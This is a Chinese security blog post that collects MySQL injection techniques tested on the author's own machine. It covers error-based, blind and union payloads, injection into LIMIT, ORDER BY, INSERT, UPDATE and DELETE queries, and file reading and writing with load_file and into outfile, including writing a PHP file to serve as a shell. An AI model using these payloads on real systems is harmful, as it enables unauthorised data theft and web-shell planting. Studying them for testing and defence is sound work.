<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>MySQL Injection Tricks | Patrilic's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">MySQL Injection Tricks</h1><a id="logo" href="/.">Patrilic's blog</a><p class="description">不忘初心</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/2019/04/01/Hello/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">MySQL Injection Tricks</h1><div class="post-meta">Apr 14, 2019<span> | </span><span class="category"><a href="/categories/SQLi-Tricks/">SQLi Tricks</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><a class="disqus-comment-count" data-disqus-identifier="2019/04/14/MySQL Injection/" href="/2019/04/14/MySQL Injection/#disqus_thread"></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Header"><span class="toc-number">1.</span> <span class="toc-text">Header</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#limit"><span class="toc-number">2.</span> <span class="toc-text">limit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by"><span class="toc-number">3.</span> <span class="toc-text">order by</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#from"><span class="toc-number">4.</span> <span class="toc-text">from</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">5.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ExtractValue"><span class="toc-number">6.</span> <span class="toc-text">ExtractValue</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UpdateXml"><span class="toc-number">7.</span> <span class="toc-text">UpdateXml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#name-const"><span class="toc-number">8.</span> <span class="toc-text">name_const</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#整数溢出报错注入"><span class="toc-number">9.</span> <span class="toc-text">整数溢出报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#insert"><span class="toc-number">10.</span> <span class="toc-text">insert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delect"><span class="toc-number">11.</span> <span class="toc-text">delect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#update"><span class="toc-number">12.</span> <span class="toc-text">update</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#into-outfile"><span class="toc-number">13.</span> <span class="toc-text">into outfile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load-file"><span class="toc-number">14.</span> <span class="toc-text">load_file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dumpfile"><span class="toc-number">15.</span> <span class="toc-text">Dumpfile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Case-When"><span class="toc-number">16.</span> <span class="toc-text">Case When</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pow"><span class="toc-number">17.</span> <span class="toc-text">Pow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#In"><span class="toc-number">18.</span> <span class="toc-text">In</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不知道列名的注入"><span class="toc-number">19.</span> <span class="toc-text">不知道列名的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Thanks"><span class="toc-number">20.</span> <span class="toc-text">Thanks</span></a></li></ol></div></div><div class="post-content"><blockquote>
<p>@Author: Patrilic<br>@Time: 2019-04-14 23:20:33<br><img src="/wallpaper/[33016]Avian Romance-54238596.png" alt></p>
</blockquote>
<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>总结一波MySQL下各式各样等注入技巧～<br><strong>Test Machine Configuration</strong></p>
<blockquote>
<p>OS：MacOS Mojave 10.14.2<br>MySQL: MySQL 5.7.19-log</p>
</blockquote>
<p>测试表结构：<br><img src="/MySQL Injection.resources/6C53ADB2-2CA5-439F-A4B9-11C003B795A0.png" alt="3dce7ef9e83548ddeb6643a6f075af4f"></p>
<h2 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h2><p>Emmmm，测试失败了<br>翻了一些文章，发现limit之后的analyse() 只适用于<strong>MySQL server version &lt;= 5.6.6</strong></p>
<p>遂使用 Windows7 x64 + MySQL 5.5.53<br><img src="/MySQL Injection.resources/D3196ADE-0044-4C92-B294-C0F04299F77A.png" alt="26ef60fa552b1e2a9df1c06c0632111b"></p>
<p>测试语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">LIMIT</span> &#123;$uid&#125;,<span class="number">3</span>;</span><br></pre></td></tr></table></figure></p>
<p>Limit 注入主要是因为后面有一个 PROCEDURE analyse() 存储过程</p>
<p>构造报错注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span>  <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">3</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">version</span>())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p>
<p><img src="/MySQL Injection.resources/2575E461-4D29-4818-9593-DCD0A35574D2.png" alt="c4033dbc4df97e555bdc39638d337f21"></p>
<p>因为5.5版本不能使用SELECT，所以只能获取一些配置信息等</p>
<p><strong>exp</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span>  <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">3</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">version</span>())),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">field</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">MID</span>(<span class="keyword">version</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>测试语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid &#123;evil&#125;;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>Order by + 报错注入<br><img src="/MySQL Injection.resources/68811865-6608-492B-9EA9-618492DCC0D1.png" alt="69d7117a4def2cf4d7d50d4c44b6ae03"></li>
</ol>
<ol start="2">
<li><p>order by + 时间盲注<br><img src="/MySQL Injection.resources/7E50257D-D914-4605-B905-974ED4AFFDDC.png" alt="68c940c3c115e97f55fcc166249e6d0d"></p>
</li>
<li><p>order by + union查询<br><img src="/MySQL Injection.resources/9D8482A7-0738-4C2C-B4F3-071B8CA50E97.png" alt="8635b1761c56ebe9d5b6204f5581517d"></p>
</li>
</ol>
<p>此注入必须使用()包围SQL语句</p>
<ol start="4">
<li>order by + regexp 盲注<br><img src="/MySQL Injection.resources/B5D21FEE-C714-4CD3-846F-CBDA2AF2129A.png" alt="27b6b63f4a93c01d5f57ee0a75c7efea"></li>
</ol>
<p>这里解释一下语句<br>当正则未匹配到数据时候返回的结果是0 所以SQL语句相当于<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
<p>排序不变<br><img src="/MySQL Injection.resources/38FFA41A-A8DA-4AE5-ACB7-FD4E5A91F294.png" alt="5a9b7d8ee50c22ed35efa6fb7e90310d"><br><strong>exp</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uid <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>()));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uid <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>()),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid ^(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">version</span>()) regexp <span class="string">'^aaaaaa'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="number">3</span>))a);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid) <span class="keyword">union</span> (<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="from"><a href="#from" class="headerlink" title="from"></a>from</h2><p>测试语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> &#123;$<span class="keyword">Tables</span>&#125;;</span><br></pre></td></tr></table></figure></p>
<p>直接嵌套子查询<br><img src="/MySQL Injection.resources/3356D524-EEEE-41BB-A7F6-EA9F38B99273.png" alt="37de6926a8a87e69f143bc5f7597342e"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>版本限制： Version &lt;= 5.5.5<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> (<span class="keyword">id</span>, username, <span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">''</span> ^ <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)), <span class="string">'patrilic'</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="ExtractValue"><a href="#ExtractValue" class="headerlink" title="ExtractValue"></a>ExtractValue</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="string">'String'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>extractvalue(target file，xml path)</p>
</blockquote>
<p><img src="/MySQL Injection.resources/E0ADE9FD-0F0C-44E7-95D8-30330401643E.png" alt="53bb49c2016af886807088cd58c0709d"><br><img src="/MySQL Injection.resources/4D36E31A-C0BE-4B4C-9657-25BB4BC7E9DA.png" alt="0e204a12a24b48d87710e60dc9b7a104"></p>
<h2 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml"></a>UpdateXml</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'String'</span>,(<span class="keyword">Select</span> <span class="keyword">user</span>()),<span class="string">'String'</span>));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>updatexml(Target file，xml path，updateinfo)</p>
</blockquote>
<p><img src="/MySQL Injection.resources/B4AE3D11-4B7E-4285-BFE2-A8DF61A86FCA.png" alt="0786dc9cffd391c4dc9aec2cad9bb334"><br><img src="/MySQL Injection.resources/1AAFC23E-4228-4028-82AB-35DA8054C11A.png" alt="b6cbf8fdd04c44eeaa03b702c00ed273"></p>
<h2 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><img src="/MySQL Injection.resources/EA30D650-D0A6-4C03-A248-B3E78D259A1A.png" alt="a02097ebcc3c66a348903385c2e09abf"></p>
<blockquote>
<p>name_const(‘1’, 14)<br>局限性很大</p>
</blockquote>
<h2 id="整数溢出报错注入"><a href="#整数溢出报错注入" class="headerlink" title="整数溢出报错注入"></a>整数溢出报错注入</h2><p>略</p>
<h2 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Insert</span> <span class="keyword">INTO</span> <span class="keyword">user</span> (uid,username,<span class="keyword">password</span>,city) <span class="keyword">VALUES</span> (?,?,?,?);</span><br></pre></td></tr></table></figure>
<p><img src="/MySQL Injection.resources/9C09B58A-2162-4FCF-8988-D8996342E899.png" alt="450be8fc5d042aa1d074506f7d5a93b7"></p>
<p><img src="/MySQL Injection.resources/4F1A02FF-2B06-4DC8-A883-D1B403287A29.png" alt="f87586d1fd2bcc77a06870c63fd14f28"></p>
<h2 id="delect"><a href="#delect" class="headerlink" title="delect"></a>delect</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> uid=&#123;$uid&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/MySQL Injection.resources/C12A30AB-E4A6-4FF2-A383-08C1F7C0398E.png" alt="fdf530943ba24e6ec996a845e0b939cb"></p>
<h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">user</span> <span class="keyword">SET</span> <span class="keyword">password</span> = &#123;$<span class="keyword">password</span>&#125; <span class="keyword">Where</span> username = &#123;session.user&#125; <span class="keyword">and</span> uid = &#123;session.uid&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/MySQL Injection.resources/97D8B22C-8B27-4254-9E8B-C288DA88E4FD.png" alt="dcae7f06664c4456708cfdd3159490e9"><br><img src="/MySQL Injection.resources/AA3C9BAB-6ACC-44F4-9FCE-E770566EEFF6.png" alt="84d8c329a9ee3222c4c075648707d4e5"></p>
<h2 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h2><p>主要用途：写shell<br>要求：</p>
<ul>
<li>要求用户具有file权限</li>
<li>文件不能覆盖写入，所以文件必须为不存在</li>
<li>如果secure_file_priv非空，则写入文件的目录只能为对应目录下<blockquote>
<p>into outfile + UNION</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> uid = <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0x3c3f70687020706870696e666f28293b3f3e</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p><img src="/MySQL Injection.resources/99802F7E-613B-4F25-8942-026AECDBE222.png" alt="bbeb09b67630a772e19b3b26e4f90b79"></p>
<blockquote>
<p>into outfile + LINES TERMINATED BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/MySQL Injection.resources/B0EEFE16-15A3-4E45-8DA7-616987B525AC.png" alt="0313b6aaee866dee9ee0cc785bc89e7b"></p>
<blockquote>
<p>into outfile + FIELDS TERMINATED BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span>  <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/MySQL Injection.resources/2E99B9C7-7369-4853-9669-7C5D56934A8B.png" alt="922aaffeb4b239df59cf0ddbea8241a2"></p>
<blockquote>
<p>into outfile + LINES STARTING BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/MySQL Injection.resources/1DE8F60F-049E-4760-8B5A-6CB07714C781.png" alt="07ad0be0a19833ec877e9c7d77f0e0bc"></p>
<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h2><p>主要用途：读文件<br>要求：</p>
<ul>
<li>要求用户具有file权限</li>
<li>如果secure_file_priv非空，则只能读取对应目录下的文件<blockquote>
<p>load_file + UNION</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'Y:/123.php'</span>));</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p><img src="/MySQL Injection.resources/72271A75-3061-4252-BE6A-8A25F2D836FF.png" alt="fda87515edd1a870031c33556799b653"></p>
<blockquote>
<p>load_file + updatexml<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">LOAD_FILE</span>(<span class="string">'Y:/123.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/MySQL Injection.resources/DDB31E30-84C6-4631-A40C-6A827C57AD55.png" alt="3b346d668d3dab3c2296330ac5421acd"></p>
<blockquote>
<p>load_file + extractive<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid=<span class="number">-1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="keyword">LOAD_FILE</span>(<span class="string">'Y:/1.php'</span>))),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/MySQL Injection.resources/4372D4EB-AC68-4E4B-9CD7-A7B7C0577854.png" alt="d068cdb2be5e81cf8ee618282fc0bb8f"></p>
<blockquote>
<p>load_file + isnull + updatexml<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">isnull</span>(<span class="keyword">LOAD_FILE</span>(<span class="string">'D:/1.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>存在文件 返回0<br>不存在文件 返回1<br><img src="/MySQL Injection.resources/01D4A547-30E3-465F-A87C-0EA99176FBDF.png" alt="d54a32ed2b31fc6fb134d7275f17eae8"></p>
<h2 id="Dumpfile"><a href="#Dumpfile" class="headerlink" title="Dumpfile"></a>Dumpfile</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> _utf8<span class="string">'Hello world!'</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'Y:/world.php'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/MySQL Injection.resources/9DCC84F2-4346-4F76-A753-2F7813A9DFE7.png" alt="c5c1ec183eb4aba323bedb95d56f2100"></p>
<h2 id="Case-When"><a href="#Case-When" class="headerlink" title="Case When"></a>Case When</h2><p><img src="/MySQL Injection.resources/QQ20190423-122637@2x.png" alt="QQ20190423-122637@2x.png"></p>
<h2 id="Pow"><a href="#Pow" class="headerlink" title="Pow"></a>Pow</h2><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/55CC5315-17DB-49AC-BBF3-8B0316AA3933.png" alt="2cb4372b6213be745ecbf701adc81349.png"><br>运算符作条件判断，如果错误数据库报错：利用pow的溢出判断limit位数的ascii</p>
<p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/DF663A7F-EB5F-41F6-9BFE-AE5A783CCF84.png" alt="f4abcef6f90ea02665adaf0f61d6ee7f.png"></p>
<h2 id="In"><a href="#In" class="headerlink" title="In"></a>In</h2><p><img src="/MySQL Injection.resources//QQ20190423-122422@2x.png" alt="QQ20190423-122422@2x.png"></p>
<h2 id="不知道列名的注入"><a href="#不知道列名的注入" class="headerlink" title="不知道列名的注入"></a>不知道列名的注入</h2><p>看原文比较好，直接复现一下<br><img src="/MySQL Injection.resources/1359C87C-0FD0-4CEC-94C2-C7FD53622F20.png" alt="292940479295c820fe09ee52cc66aa61"><br><img src="/MySQL Injection.resources/C5353C73-C707-450C-AB0E-BC841DCDA2C9.png" alt="aa99b8908afbca3697612a580cf940eb"><br><img src="/MySQL Injection.resources/36489756-1393-404C-B72F-64E08CBF6877.png" alt="9dbf0195c2217b9ae5bc52ca52e89fd6"><br><img src="/MySQL Injection.resources/6B13EF6C-92F9-4238-9A6D-D6BBC9DB2A8A.png" alt="232655760d9f318c95d8c69b68f1827f"></p>
<h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p><a href="https://www.lucifaer.com/2018/08/13/MySQLi%20Cookbook/" target="_blank" rel="noopener">MySQLi Cookbook</a><br><a href="https://www.cnblogs.com/lcamry/" target="_blank" rel="noopener">lcamry’s blog</a><br><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">报错注入邂逅load_file&amp;into outfile搭讪LINES</a><br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">sqli-extracting-data-without-knowing-columns-name</a><br><a href="https://legacy.gitbook.com/book/wangyihang/sqli-labs/details" target="_blank" rel="noopener">wangyihang-sqli-labs-Script</a><br><a href="https://xz.aliyun.com/t/3992" target="_blank" rel="noopener">史上最水的MYSQL注入总结</a></p>
</div><div class="tags"><a href="/tags/SQL注入/">SQL注入</a></div><div class="post-nav"><a class="pre" href="/2019/04/18/ADS 隐藏后门/">ADS隐藏后门</a><a class="next" href="/2019/04/05/Upload-labs Writeup/">Upload-labs Writeup</a></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">阅读评论（请确保 Disqus 可以正常加载）</button></div><script type="text/javascript">var disqus_config = function () {
    this.page.url = 'http://patrilic.top/2019/04/14/MySQL Injection/';
    this.page.identifier = '2019/04/14/MySQL Injection/';
    this.page.title = 'MySQL Injection Tricks';
  };</script><script type="text/javascript" id="disqus-lazy-load-script">$.ajax({
url: 'https://disqus.com/next/config.json',
timeout: 2500,
type: 'GET',
success: function(){
  var d = document;
  var s = d.createElement('script');
  s.src = '//Patrilic.disqus.com/embed.js';
  s.setAttribute('data-timestamp', + new Date());
  (d.head || d.body).appendChild(s);
  $('.disqus_click_btn').css('display', 'none');
},
error: function() {
  $('.disqus_click_btn').css('display', 'block');
}
});</script><script type="text/javascript" id="disqus-click-load">$('.btn_click_load').click(() => {  //click to load comments
    (() => { // DON'T EDIT BELOW THIS LINE
        var d = document;
        var s = d.createElement('script');
        s.src = '//Patrilic.disqus.com/embed.js';
        s.setAttribute('data-timestamp', + new Date());
        (d.head || d.body).appendChild(s);
    })();
    $('.disqus_click_btn').css('display','none');
});</script><script type="text/javascript" id="disqus-count-script">$(function() {
